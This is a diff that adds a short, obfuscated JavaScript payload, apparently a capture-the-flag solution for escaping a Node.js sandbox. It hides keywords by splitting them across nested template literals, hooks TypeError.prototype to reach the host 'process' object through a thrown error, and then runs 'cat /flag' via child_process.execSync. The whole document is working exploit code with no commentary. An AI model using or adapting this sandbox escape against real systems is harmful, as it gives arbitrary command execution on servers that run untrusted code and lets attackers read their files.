@@ -1,0 +1,8 @@
+(function (){
+    TypeError[`${`${`prototyp`}e`}`][`${`${`get_pro`}cess`}`] = f=>f[`${`${`constructo`}r`}`](`${`${`return proc`}ess`}`)();
+    try{
+        Object.preventExtensions(Buffer.from(``)).a = 1;
+    }catch(e){
+        return e[`${`${`get_pro`}cess`}`](()=>{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString();
+    }
+})()
